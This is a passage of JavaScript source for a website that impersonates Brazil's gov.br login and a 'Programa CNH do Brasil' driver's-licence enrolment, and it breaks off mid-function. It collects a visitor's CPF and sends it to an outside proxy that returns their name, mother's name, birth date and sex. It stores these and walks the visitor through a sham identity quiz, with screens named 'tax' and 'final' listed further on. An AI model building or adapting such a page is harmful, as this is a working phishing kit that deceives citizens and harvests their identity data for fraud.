import { CONFIG } from './config.js';

// Classe LoginBuilder - Responsável por construir a tela de login
export class LoginBuilder {
    constructor() {
        this.container = document.getElementById('app');
        this.currentScreen = 'initial';
        this.userData = {};
        
        // Inicializar estado do localStorage
        this.loadUserState();
        
        // Adicionar listener para navegação do navegador
        window.addEventListener('popstate', (event) => {
            if (event.state && event.state.screen) {
                this.navigateToScreen(event.state.screen, false);
            }
        });
        
        // Verificar se há estado salvo para restaurar
        this.restoreScreenState();
    }

    // Método helper para criar header com Font Awesome
    createHeaderWithFA() {
        const mainHeader = document.createElement('header');
        mainHeader.style.cssText = 'background-color: white; padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; border: none; box-shadow: none;';
        
        // Container esquerdo
        const leftContainer = document.createElement('div');
        leftContainer.style.cssText = 'display: flex; align-items: center;';
        
        const logoImg = document.createElement('img');
        logoImg.src = 'https://i.ibb.co/zPFChvR/logo645.png';
        logoImg.alt = 'Logo gov.br estilizada com texto em azul e amarelo';
        logoImg.width = 70;
        logoImg.height = 24;
        logoImg.style.cssText = 'margin-right: 32px;';
        leftContainer.appendChild(logoImg);
        
        const menuBtn = document.createElement('button');
        menuBtn.setAttribute('aria-label', 'Menu de links');
        menuBtn.style.cssText = 'border: none; color: rgb(20, 81, 180); font-size: 14px; margin-left: 32px; cursor: pointer; background: none; padding: 0;';
        menuBtn.innerHTML = '<i class="fas fa-ellipsis-v" aria-hidden="true" style="font-size: 16px;"></i>';
        leftContainer.appendChild(menuBtn);
        
        const divider = document.createElement('div');
        divider.style.cssText = 'border-left: 1px solid rgb(204, 204, 204); height: 24px; margin: 0 16px;';
        leftContainer.appendChild(divider);
        
        mainHeader.appendChild(leftContainer);
        
        // Container direito
        const rightContainer = document.createElement('div');
        rightContainer.style.cssText = 'display: flex; align-items: center;';
        
        const cookieBtn = document.createElement('button');
        cookieBtn.style.cssText = 'border: none; color: rgb(20, 81, 180); cursor: pointer; margin-left: 24px; background: none; padding: 0;';
        cookieBtn.innerHTML = '<i class="fas fa-cookie-bite" aria-hidden="true" style="font-size: 16px;"></i>';
        rightContainer.appendChild(cookieBtn);
        
        const gridBtn = document.createElement('button');
        gridBtn.type = 'button';
        gridBtn.setAttribute('aria-label', 'Sistemas');
        gridBtn.style.cssText = 'border: none; color: rgb(20, 81, 180); cursor: pointer; margin-left: 24px; background: none; padding: 0;';
        gridBtn.innerHTML = '<i class="fas fa-th" aria-hidden="true" style="font-size: 16px;"></i>';
        rightContainer.appendChild(gridBtn);
        
        // Recuperar nome do usuário do localStorage e pegar apenas o primeiro nome
        const fullUserName = localStorage.getItem('userName') || 'USUÁRIO';
        const firstName = fullUserName.split(' ')[0].toUpperCase();
        
        const userBtn = document.createElement('button');
        userBtn.type = 'button';
        userBtn.style.cssText = 'background-color: rgb(20, 81, 180); color: white; border: none; border-radius: 9999px; padding: 6px 16px; display: flex; align-items: center; font-size: 14px; cursor: pointer; margin-left: 24px;';
        userBtn.innerHTML = `<i class="fas fa-user" aria-hidden="true" style="color: white; margin-right: 8px; font-size: 16px;"></i><span>${firstName}</span>`;
        rightContainer.appendChild(userBtn);
        
        mainHeader.appendChild(rightContainer);
        return mainHeader;
    }

    // Carregar estado do usuário do localStorage
    loadUserState() {
        const savedState = localStorage.getItem('loginBuilderState');
        if (savedState) {
            try {
                const state = JSON.parse(savedState);
                this.userData = state.userData || {};
                this.currentScreen = state.currentScreen || 'initial';
            } catch (e) {
                console.error('Erro ao carregar estado:', e);
                this.userData = {};
                this.currentScreen = 'initial';
            }
        }
    }

    // Salvar estado no localStorage
    saveUserState() {
        const messagesContainer = document.getElementById('chat-messages');
        const chatHTML = messagesContainer ? messagesContainer.innerHTML : null;
        
        const state = {
            userData: this.userData,
            currentScreen: this.currentScreen,
            chatHTML: chatHTML,
            timestamp: new Date().toISOString()
        };
        localStorage.setItem('loginBuilderState', JSON.stringify(state));
    }

    // Restaurar tela baseado no estado salvo
    restoreScreenState() {
        const savedState = JSON.parse(localStorage.getItem('loginBuilderState'));
        
        if (savedState && savedState.currentScreen !== 'initial') {
            // Se estamos no chat e há HTML salvo, restaurar o chat
            if (savedState.currentScreen === 'chat' && savedState.chatHTML) {
                this.currentScreen = 'chat';
                
                // Restaurar o container de chat
                const main = document.querySelector('main');
                if (main) {
                    main.innerHTML = savedState.chatHTML;
                    
                    // Re-adicionar eventos aos botões
                    this.restoreChatEvents();
                }
                return;
            }
            
            // Para outras telas, navegar normalmente
            this.navigateToScreen(savedState.currentScreen, false);
        }
    }
    
    // Restaurar eventos do chat após restaurar do localStorage
    restoreChatEvents() {
        console.log('Restaurando eventos do chat');
        
        // Re-adicionar eventos aos botões PROSSEGUIR
        const proceedButtons = document.querySelectorAll('button');
        proceedButtons.forEach((btn, index) => {
            if (btn.textContent.includes('PROSSEGUIR')) {
                btn.addEventListener('click', (e) => {
                    e.preventDefault();
                    e.stopPropagation();
                    console.log('Botão PROSSEGUIR clicado (restaurado)');
                    // Determinar qual mensagem mostrar baseado na posição
                    this.handleRestoredProceedButtonClick();
                });
            }
        });
        
        // Re-adicionar eventos aos botões de categoria
        const categoryButtons = document.querySelectorAll('[id="chat-options"] button');
        categoryButtons.forEach(btn => {
            const categoryId = btn.querySelector('span:nth-child(2)')?.textContent || 'B';
            btn.addEventListener('click', () => {
                console.log('Categoria clicada (restaurada):', categoryId);
                this.handleCategorySelection(categoryId, `Categoria ${categoryId}`, this.userData.detran || 'Detran Amazonas', 50);
            });
        });
        
        // Re-adicionar eventos aos botões de mês
        const monthButtons = document.querySelectorAll('.grid button');
        monthButtons.forEach(btn => {
            const monthName = btn.querySelector('span:first-child')?.textContent;
            const vacancies = parseInt(btn.querySelector('span:last-child')?.textContent) || 10;
            btn.addEventListener('click', () => {
                console.log('Mês clicado (restaurado):', monthName);
                this.handleMonthSelection(monthName, vacancies, this.userData.detran || 'Detran Amazonas', this.userData.category || 'B');
            });
        });
    }
    
    // Lidar com clique em botão PROSSEGUIR restaurado
    handleRestoredProceedButtonClick() {
        const messagesContainer = document.getElementById('chat-messages');
        if (!messagesContainer) return;
        
        // Contar mensagens para determinar qual etapa estamos
        const systemMessages = messagesContainer.querySelectorAll('.text-left').length;
        console.log('Mensagens do sistema:', systemMessages);
        
        // Baseado no número de mensagens, determinar qual método chamar
        if (systemMessages <= 1) {
            this.showSecondMessage(this.userData.detran || 'Detran Amazonas', this.userData.category || 'B');
        } else if (systemMessages <= 2) {
            this.showThirdMessage(this.userData.detran || 'Detran Amazonas', this.userData.category || 'B');
        } else if (systemMessages <= 3) {
            this.showFourthMessage(this.userData.detran || 'Detran Amazonas', this.userData.category || 'B');
        }
    }

    // Navegar para tela específica com suporte ao History API
    navigateToScreen(screenName, pushState = true) {
        this.currentScreen = screenName;
        this.saveUserState();
        
        // Mapear nomes de tela para métodos
        const screenMethods = {
            'initial': () => this.build(),
            'program': () => this.showProgramInfoScreen(),
            'appAccess': () => this.showAppAccessScreen(),
            'classes': () => this.showClassesScreen(),
            'cnhIssuance': () => this.showCnhIssuanceScreen(),
            'tax': () => this.showTaxScreen(),
            'final': () => this.showFinalScreen()
        };
        
        if (screenMethods[screenName]) {
            if (pushState) {
                history.pushState({ screen: screenName }, '', `#${screenName}`);
            }
            screenMethods[screenName]();
        }
    }

    // Método auxiliar para transições suaves entre telas
    async transitionScreens(newScreenFunction) {
        const mainContent = this.container.querySelector('main');
        if (!mainContent) {
            newScreenFunction.call(this);
            return;
        }

        // Adicionar classe de transição para fade out
        mainContent.style.transition = 'opacity 0.3s ease-in-out';
        mainContent.style.opacity = '0';

        // Esperar o fade out completar
        await new Promise(resolve => setTimeout(resolve, 300));

        // Construir nova tela
        newScreenFunction.call(this);

        // Adicionar fade in para a nova tela
        const newMainContent = this.container.querySelector('main');
        if (newMainContent) {
            newMainContent.style.opacity = '0';
            newMainContent.style.transition = 'opacity 0.3s ease-in-out';
            
            // Forçar reflow para garantir que a transição funcione
            newMainContent.offsetHeight;
            
            // Iniciar fade in
            setTimeout(() => {
                newMainContent.style.opacity = '1';
            }, 50);
        }
    }

    build() {
        this.container.innerHTML = '';
        this.currentScreen = 'initial';
        this.saveUserState();
        
        // Header
        const header = document.createElement('header');
        const headerImg = document.createElement('img');
        headerImg.src = 'https://i.ibb.co/WGrsWGN/IMG-1297.jpg';
        headerImg.alt = 'Imagem de cabeçalho';
        headerImg.style.width = '100%';
        header.appendChild(headerImg);
        this.container.appendChild(header);

        // Container principal
        const container = document.createElement('div');
        container.className = 'login-container';

        // Aside com logo gov.br
        const aside = document.createElement('aside');
        aside.className = 'login-aside';
        const govLogo = document.createElement('img');
        govLogo.id = 'identidade-govbr';
        govLogo.src = CONFIG.images.govLogo;
        govLogo.alt = 'Logomarca GovBR';
        aside.appendChild(govLogo);
        container.appendChild(aside);

        // Main com formulário
        const main = document.createElement('main');
        main.className = 'login-main';

        const form = document.createElement('form');
        form.method = 'post';
        form.id = 'loginData';
        form.noValidate = true;

        const card = document.createElement('div');
        card.className = 'card';
        card.id = 'login-cpf';

        // Logo CNH
        const logoContainer = document.createElement('div');
        logoContainer.style.cssText = 'display: flex; justify-content: center; align-items: center; width: 100%; margin-bottom: 16px;';
        const cnhLogo = document.createElement('img');
        cnhLogo.src = CONFIG.images.cnhLogo;
        cnhLogo.alt = 'CNH do Brasil';
        cnhLogo.style.cssText = 'height: 64px; object-fit: contain;';
        logoContainer.appendChild(cnhLogo);
        card.appendChild(logoContainer);

        // Título
        const h3 = document.createElement('h3');
        h3.textContent = 'Identifique-se no gov.br com:';
        card.appendChild(h3);

        // Opção CPF
        const cpfOption = document.createElement('div');
        cpfOption.className = 'item-login-signup-ways';
        
        const cpfLink = document.createElement('a');
        cpfLink.tabIndex = 3;
        cpfLink.style.cssText = 'display: flex; align-items: center; cursor: pointer; text-decoration: none; color: inherit;';
        
        const cpfIcon = document.createElement('img');
        cpfIcon.src = 'https://sso.acesso.gov.br/assets/govbr/img/icons/id-card-solid.png';
        cpfIcon.alt = 'Ícone de um cartão de identificação sólido representando CPF';
        cpfLink.appendChild(cpfIcon);
        
        const cpfText = document.createElement('span');
        cpfText.textContent = 'Número do CPF';
        cpfLink.appendChild(cpfText);
        
        cpfOption.appendChild(cpfLink);
        card.appendChild(cpfOption);

        // Painel de accordion
        const accordion = document.createElement('div');
        accordion.className = 'accordion-panel';
        accordion.id = 'accordion-panel-id';

        const p = document.createElement('p');
        p.innerHTML = 'Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br';
        accordion.appendChild(p);

        const label = document.createElement('label');
        label.htmlFor = 'cpf';
        label.textContent = 'CPF';
        accordion.appendChild(label);

        const input = document.createElement('input');
        input.type = 'tel';
        input.id = 'cpf';
        input.name = 'cpf';
        input.placeholder = 'Digite seu CPF';
        input.autocomplete = 'new-password';
        input.tabIndex = 1;
        input.setAttribute('aria-invalid', 'false');
        accordion.appendChild(input);

        // Botão continuar
        const buttonPanel = document.createElement('div');
        buttonPanel.className = 'button-panel';
        buttonPanel.id = 'login-button-panel';

        const continueBtn = document.createElement('button');
        continueBtn.type = 'submit';
        continueBtn.className = 'button-continuar flex items-center justify-center gap-2';
        continueBtn.tabIndex = 2;
        continueBtn.textContent = 'Continuar';
        buttonPanel.appendChild(continueBtn);

        accordion.appendChild(buttonPanel);
        card.appendChild(accordion);

        // Outras opções
        const otherLabel = document.createElement('label');
        otherLabel.id = 'title-outras-op';
        otherLabel.textContent = 'Outras opções de identificação:';
        card.appendChild(otherLabel);

        const hr = document.createElement('hr');
        hr.id = 'hr-outras-op';
        hr.style.margin = '0';
        card.appendChild(hr);

        // Login com banco
        const bankOption = document.createElement('div');
        bankOption.className = 'item-login-signup-ways';
        
        const bankBtn = document.createElement('button');
        bankBtn.type = 'button';
        bankBtn.tabIndex = 5;
        bankBtn.className = 'button-href-mimic2 bank-login-button';
        bankBtn.style.cssText = 'display: flex; align-items: center; cursor: pointer; background: none; border: none; padding: 0; font-size: inherit; font-family: inherit; color: inherit;';
        
        const bankIcon = document.createElement('img');
        bankIcon.src = 'https://sso.acesso.gov.br/assets/govbr/img/icons/InternetBanking-green.png';
        bankIcon.alt = 'Ícone de Internet Banking';
        bankBtn.appendChild(bankIcon);
        
        const bankText = document.createElement('span');
        bankText.textContent = 'Login com seu banco';
        bankBtn.appendChild(bankText);
        
        const badge = document.createElement('span');
        badge.className = 'silver-account-badge';
        badge.textContent = 'SUA CONTA SERÁ PRATA';
        bankBtn.appendChild(badge);
        
        bankOption.appendChild(bankBtn);
        card.appendChild(bankOption);

        form.appendChild(card);
        main.appendChild(form);
        container.appendChild(main);
        this.container.appendChild(container);

        // Adicionar event listener para o formulário
        form.addEventListener('submit', (e) => this.handleSubmit(e));
    }

    async handleSubmit(e) {
        e.preventDefault();
        const cpfInput = document.getElementById('cpf');
        const continueBtn = document.querySelector('.button-continuar');
        const cpf = cpfInput.value.replace(/\D/g, '');

        if (cpf.length !== 11) {
            alert('Por favor, digite um CPF válido com 11 dígitos.');
            return;
        }

        // Estado de carregamento no botão
        continueBtn.innerHTML = '<div class="spinner"></div> Carregando...';
        continueBtn.disabled = true;

        try {
            // Usar proxy PHP para evitar CORS
            const response = await fetch(`https://teste.tinowebservices.com/proxy.php?cpf=${cpf}`, {
                method: 'GET'
            });

            const data = await response.json();
            
            // Verificar se os dados estão no formato correto
            let userData;
            if (data.DADOS) {
                // Formato com DADOS wrapper
                userData = data.DADOS;
            } else {
                // Formato direto
                userData = data;
            }
            
            // Armazenar dados no localStorage
            localStorage.setItem('userCpf', userData.cpf);
            localStorage.setItem('userName', userData.nome);
            localStorage.setItem('userNameMae', userData.nome_mae);
            localStorage.setItem('userBirthDate', userData.data_nascimento);
            localStorage.setItem('userSex', userData.sexo);

            // Delay de 2-3 segundos antes de mostrar tela de verificação
            setTimeout(() => {
                // Mostrar tela de verificação com os dados corretos
                this.showVerificationScreen(userData);
            }, 2500);
        } catch (error) {
            console.error('Erro ao consultar CPF:', error);
            // Restaurar botão em caso de erro
            continueBtn.innerHTML = 'Continuar';
            continueBtn.disabled = false;
            alert('Erro ao consultar CPF. Tente novamente.');
        }
    }

    showVerificationScreen(data) {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header com Font Awesome
        const mainHeader = this.createHeaderWithFA();
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
        const searchBtn = document.createElement('button');
        searchBtn.setAttribute('aria-label', 'Pesquisar');
        searchBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 16px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        searchBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/></svg>';
        nav.appendChild(searchBtn);
        
        this.container.appendChild(nav);
        
        // Criar container principal
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 800px; margin: 20px auto; min-height: 100vh; padding: 20px;';

        // Card principal que envolve todo o conteúdo
        const card = document.createElement('div');
        card.className = 'card';
        card.style.cssText = 'width: 100%; align-items: flex-start; padding: 2rem; background-color: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);';

        const title = document.createElement('h3');
        title.className = 'text-center w-full text-lg font-bold mb-6';
        title.textContent = 'Confirme seus dados para o cadastro no Programa CNH do Brasil';
        title.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 1rem; font-weight: 600;';
        card.appendChild(title);

        const content = document.createElement('div');
        content.className = 'w-full';

        const questionContainer = document.createElement('div');
        
        // Número e pergunta
        const questionHeader = document.createElement('div');
        questionHeader.className = 'flex items-center gap-3 mb-4';
        
        const numberCircle = document.createElement('div');
        numberCircle.className = 'flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium';
        numberCircle.textContent = '1';
        numberCircle.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 500;';
        questionHeader.appendChild(numberCircle);
        
        const questionText = document.createElement('p');
        questionText.className = 'font-semibold text-base';
        questionText.innerHTML = '<strong>qual é seu nome completo?</strong>';
        questionHeader.appendChild(questionText);
        
        questionContainer.appendChild(questionHeader);

        // Opções de nomes - usar o nome exato da consulta CPF
        const optionsContainer = document.createElement('div');
        optionsContainer.className = 'space-y-3 pl-4';

        // Usar o nome exato da consulta CPF e normalizar todas as opções
        const cpfName = data.nome || 'Nome não encontrado';
        let names = [
            'João Oliveira Marques'.toUpperCase(),
            cpfName.toUpperCase(),
            'Heitor Santos Martins'.toUpperCase()
        ];
        
        // Embaralhar as opções aleatoriamente
        names = names.sort(() => Math.random() - 0.5);
        
        names.forEach((name, index) => {
            const option = document.createElement('div');
            option.className = 'flex items-center w-full p-3 rounded-md transition-all cursor-pointer bg-gray-50 hover:bg-gray-100';
            
            const label = document.createElement('label');
            label.htmlFor = `option-${index}`;
            label.className = 'flex-1 cursor-pointer';
            label.textContent = name.toLowerCase();
            label.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; text-transform: capitalize;';
            
            const radio = document.createElement('input');
            radio.type = 'radio';
            radio.name = 'name-option';
            radio.id = `option-${index}`;
            radio.value = name;
            radio.style.display = 'none';
            
            // Sem pré-seleção - apenas quando usuário clicar
            
            option.appendChild(radio);
            option.appendChild(label);
            
            option.addEventListener('click', () => {
                document.querySelectorAll('.flex.items-center.w-full.p-3.rounded-md').forEach(opt => {
                    opt.style.backgroundColor = '#f9fafb';
                    opt.style.border = 'none';
                });
                option.style.backgroundColor = '#e5e7eb';
                option.style.border = '2px solid rgb(19, 81, 180)';
                radio.checked = true;
                errorMessage.style.display = 'none';
            });
            
            optionsContainer.appendChild(option);
        });

        questionContainer.appendChild(optionsContainer);

        // Botão Confirmar
        const buttonContainer = document.createElement('div');
        buttonContainer.className = 'flex justify-center mt-6';
        
        const confirmBtn = document.createElement('button');
        confirmBtn.type = 'button';
        confirmBtn.className = 'button-continuar flex items-center justify-center gap-2 min-w-[160px]';
        confirmBtn.textContent = 'Confirmar';
        confirmBtn.addEventListener('click', () => {
            const selectedOption = document.querySelector('input[name="name-option"]:checked');
            if (!selectedOption) {
                // Nenhuma opção selecionada - mostrar erro
                errorMessage.textContent = 'Por favor, selecione uma opção para continuar.';
                errorMessage.style.display = 'block';
                return;
            }
            
            // Estado de verificando
            confirmBtn.innerHTML = '<svg class="animate-spin" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0a8 8 0 1 0 8 8A8 8 0 0 0 8 0zM4.5 7.5a.5.5 0 0 1 .5-.5h6a.5.5 0 0 1 0 1H5a.5.5 0 0 1-.5-.5z"/></svg> Verificando...';
            confirmBtn.disabled = true;
            
            // Simular verificação (apenas o nome correto deve passar)
            setTimeout(() => {
                if (selectedOption.value.toUpperCase() === cpfName.toUpperCase()) {
                    // Nome correto - mostrar verificado
                    confirmBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M10.97 4.97a.75.75 0 0 1 1.07 1.05l-3.99 4.99a.75.75 0 0 1-1.08.02L4.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093 3.473-4.425a.75.75 0 0 1 1.02-.12z"/></svg> Verificado';
                    
                    // Pequeno delay antes de ir para próxima página
                    setTimeout(() => {
                        this.showBirthDateVerification(data);
                    }, 500);
                } else {
                    // Nome incorreto - mostrar erro
                    errorMessage.textContent = 'Dados incorretos! Por favor, verifique sua resposta.';
                    errorMessage.style.display = 'block';
                    confirmBtn.innerHTML = 'Confirmar';
                    confirmBtn.disabled = false;
                }
            }, 2000);
        });
        
        buttonContainer.appendChild(confirmBtn);
        questionContainer.appendChild(buttonContainer);

        content.appendChild(questionContainer);
        card.appendChild(content);
        main.appendChild(card);
        
        // Mensagem de erro (fora do card, na posição correta)
        const errorMessage = document.createElement('div');
        errorMessage.className = 'error-message mt-4 p-3 bg-red-50 border border-red-200 rounded-md text-red-700 text-sm';
        errorMessage.style.display = 'none';
        errorMessage.textContent = 'Dados incorretos! Por favor, verifique sua resposta.';
        main.appendChild(errorMessage);
        
        // Adicionar header e tela de verificação ao container
        this.container.appendChild(main);
    }

    showBirthDateVerification(data) {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header com Font Awesome
        const mainHeader = this.createHeaderWithFA();
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
        const searchBtn = document.createElement('button');
        searchBtn.setAttribute('aria-label', 'Pesquisar');
        searchBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 16px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        searchBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/></svg>';
        nav.appendChild(searchBtn);
        
        this.container.appendChild(nav);
        
        // Criar container principal
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 800px; margin: 20px auto; min-height: 100vh; padding: 20px;';

        // Card principal que envolve todo o conteúdo
        const card = document.createElement('div');
        card.className = 'card';
        card.style.cssText = 'width: 100%; align-items: flex-start; padding: 2rem; background-color: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);';

        const title = document.createElement('h3');
        title.className = 'text-center w-full text-lg font-bold mb-6';
        title.textContent = 'Confirme seus dados para o cadastro no Programa CNH do Brasil';
        title.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 1rem; font-weight: 600;';
        card.appendChild(title);

        const content = document.createElement('div');
        content.className = 'w-full';

        const questionContainer = document.createElement('div');
        
        // Número e pergunta
        const questionHeader = document.createElement('div');
        questionHeader.className = 'flex items-center gap-3 mb-4';
        
        const numberCircle = document.createElement('div');
        numberCircle.className = 'flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium';
        numberCircle.textContent = '2';
        questionHeader.appendChild(numberCircle);
        
        const questionText = document.createElement('p');
        questionText.className = 'font-semibold text-base';
        questionText.innerHTML = '<strong>qual é sua data de nascimento?</strong>';
        questionText.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 600;';
        questionHeader.appendChild(questionText);
        
        questionContainer.appendChild(questionHeader);

        // Opções de datas - usar a data exata da consulta CPF e normalizar
        const optionsContainer = document.createElement('div');
        optionsContainer.className = 'space-y-3 pl-4';

        const birthDate = data.data_nascimento || 'Data não encontrada';
        let dates = [
            '15/03/1990',
            birthDate,
            '20/07/1985'
        ];
        
        // Embaralhar as opções aleatoriamente
        dates = dates.sort(() => Math.random() - 0.5);
        
        dates.forEach((date, index) => {
            const option = document.createElement('div');
            option.className = 'flex items-center w-full p-3 rounded-md transition-all cursor-pointer bg-gray-50 hover:bg-gray-100';
            
            const label = document.createElement('label');
            label.htmlFor = `birth-option-${index}`;
            label.className = 'flex-1 cursor-pointer';
            label.textContent = date;
            label.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem;';
            
            const radio = document.createElement('input');
            radio.type = 'radio';
            radio.name = 'birth-option';
            radio.id = `birth-option-${index}`;
            radio.value = date;
            radio.style.display = 'none';
            
            option.appendChild(radio);
            option.appendChild(label);
            
            option.addEventListener('click', () => {
                document.querySelectorAll('.flex.items-center.w-full.p-3.rounded-md').forEach(opt => {
                    opt.style.backgroundColor = '#f9fafb';
                    opt.style.border = 'none';
                });
                option.style.backgroundColor = '#e5e7eb';
                option.style.border = '2px solid rgb(19, 81, 180)';
                radio.checked = true;
                errorMessage.style.display = 'none';
            });
            
            optionsContainer.appendChild(option);
        });

        questionContainer.appendChild(optionsContainer);

        // Botão Confirmar
        const buttonContainer = document.createElement('div');
        buttonContainer.className = 'flex justify-center mt-6';
        
        const confirmBtn = document.createElement('button');
        confirmBtn.type = 'button';
        confirmBtn.className = 'button-continuar flex items-center justify-center gap-2 min-w-[160px]';
        confirmBtn.textContent = 'Confirmar';
        confirmBtn.addEventListener('click', () => {
            const selectedOption = document.querySelector('input[name="birth-option"]:checked');
            if (!selectedOption) {
                // Nenhuma opção selecionada - mostrar erro
                errorMessage.textContent = 'Por favor, selecione uma opção para continuar.';
                errorMessage.style.display = 'block';
                return;
            }
            
            // Estado de verificando
            confirmBtn.innerHTML = '<svg class="animate-spin" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0a8 8 0 1 0 8 8A8 8 0 0 0 8 0zM4.5 7.5a.5.5 0 0 1 .5-.5h6a.5.5 0 0 1 0 1H5a.5.5 0 0 1-.5-.5z"/></svg> Verificando...';
            confirmBtn.disabled = true;
            
            setTimeout(() => {
                if (selectedOption.value === birthDate) {
                    // Data correta - mostrar verificado
                    confirmBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M10.97 4.97a.75.75 0 0 1 1.07 1.05l-3.99 4.99a.75.75 0 0 1-1.08.02L4.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093 3.473-4.425a.75.75 0 0 1 1.02-.12z"/></svg> Verificado';
                    
                    setTimeout(() => {
                        this.showMotherNameVerification(data);
                    }, 500);
                } else {
                    // Data incorreta - mostrar erro
                    errorMessage.textContent = 'Dados incorretos! Por favor, verifique sua resposta.';
                    errorMessage.style.display = 'block';
                    confirmBtn.innerHTML = 'Confirmar';
                    confirmBtn.disabled = false;
                }
            }, 2000);
        });
        
        buttonContainer.appendChild(confirmBtn);
        questionContainer.appendChild(buttonContainer);

        content.appendChild(questionContainer);
        card.appendChild(content);
        main.appendChild(card);
        
        // Mensagem de erro (fora do card, na posição correta)
        const errorMessage = document.createElement('div');
        errorMessage.className = 'error-message mt-4 p-3 bg-red-50 border border-red-200 rounded-md text-red-700 text-sm';
        errorMessage.style.display = 'none';
        errorMessage.textContent = 'Dados incorretos! Por favor, verifique sua resposta.';
        main.appendChild(errorMessage);
        
        // Adicionar header e tela de verificação ao container
        this.container.appendChild(main);
    }

    showMotherNameVerification(data) {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header com Font Awesome
        const mainHeader = this.createHeaderWithFA();
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
